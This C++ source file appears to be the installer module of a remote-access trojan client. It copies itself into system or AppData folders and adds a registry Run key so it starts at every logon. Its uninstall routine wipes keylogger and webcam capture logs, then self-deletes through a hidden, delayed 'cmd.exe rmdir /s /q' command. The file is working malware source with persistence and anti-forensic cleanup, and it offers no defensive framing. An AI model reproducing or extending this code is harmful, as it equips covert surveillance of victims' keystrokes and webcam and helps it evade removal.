#include "Install.h"


// TODO convert recursive chain to if statement
void Install::installClient(int numOfPath, const std::string& locationOfCurrentExe,const std::string& subdirectoryName,
                            const std::string& subdirectoryFileName,const std::string& nameOfStartUpFile){
    if (numOfPath==-1)return;
    std::filesystem::path whereToInstall = convertNumToPath(numOfPath);
    whereToInstall /= subdirectoryName;
    whereToInstall /= subdirectoryFileName;
    if (!std::filesystem::exists(whereToInstall)){
        try {
            std::filesystem::create_directory(whereToInstall.parent_path());
            std::filesystem::copy(locationOfCurrentExe, whereToInstall);
            installStartUpFile(whereToInstall,nameOfStartUpFile);
        } catch (const std::filesystem::__cxx11::filesystem_error& e){
            if (numOfPath!=2)installClient(2,locationOfCurrentExe,subdirectoryName,subdirectoryFileName,nameOfStartUpFile);
        }
    }
}

void Install::installStartUpFile(const std::wstring& clientPath,const std::string& startUpName){
    if (!startUpName.empty()){
        HKEY hkey = nullptr;
        RegCreateKey(HKEY_CURRENT_USER,R"(SOFTWARE\Microsoft\Windows\CurrentVersion\Run)", &hkey); //Creates a key
        RegSetValueExW(hkey, Converter::string2wstring(STARTUP_NAME).c_str(), 0, REG_SZ, (LPBYTE)clientPath.c_str(), wcslen(clientPath.c_str())* sizeof(wchar_t ));
    }
}

std::wstring Install::convertNumToPath(int numOfPath){
    switch (numOfPath){
        case 0: return getProgramFilesPath();
        case 1: return getWindowsPath();
        case 2: return getAppDataPath();
        default:;
    }
    return L"";
}

void Install::uninstall(){
    deleteLogs();
    deleteFiles();
}

void Install::deleteLogs(){
#ifdef WEBCAM
    std::filesystem::path webcamLogsPath(getAppDataPath().append(L"\\"+Converter::string2wstring(WEBCAM)));
    std::filesystem::remove_all(webcamLogsPath);
#endif
#ifdef KEYLOGGER
    std::filesystem::path keyloggerLogsPath(getAppDataPath().append(L"\\"+Converter::string2wstring(KEYLOGGER)));
    std::filesystem::remove_all(keyloggerLogsPath);
#endif
}



void Install::deleteFiles(){
    std::filesystem::path whereToInstall = convertNumToPath(INSTALL_PATH);
    whereToInstall /= SUBDIRECTORY_NAME;
    TCHAR szModuleName[MAX_PATH];
    TCHAR szCmd[2 * MAX_PATH];
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {nullptr};

    GetModuleFileName(nullptr, szModuleName, MAX_PATH);

    std::string commandToDelete = "cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & rmdir /s /q ";
    commandToDelete.append(std::filesystem::path(whereToInstall).string());
    std::cout << std::filesystem::path(whereToInstall).string() << std::endl;

    StringCbPrintf(szCmd, 2 * MAX_PATH, commandToDelete.c_str(), szModuleName);

    CreateProcess(nullptr, szCmd, nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    exit(0);
}

std::wstring Install::getAppDataPath(){
    auto path = std::filesystem::temp_directory_path()
            .parent_path()
            .parent_path();
    return path.wstring();
}

std::wstring Install::getProgramFilesPath(){
    WCHAR pf[MAX_PATH];
    SHGetSpecialFolderPathW(
            nullptr,
            pf,
            CSIDL_PROGRAM_FILES,
            FALSE );
    std::wstring toReturn(&pf[0], sizeof(pf)/sizeof(pf[0]));
    return toReturn;
}

std::wstring Install::getWindowsPath(){
    WCHAR winDir[MAX_PATH];
    GetWindowsDirectoryW(winDir, MAX_PATH);
    std::wstring toReturn(&winDir[0], sizeof(winDir)/sizeof(winDir[0]));
    return toReturn;
}
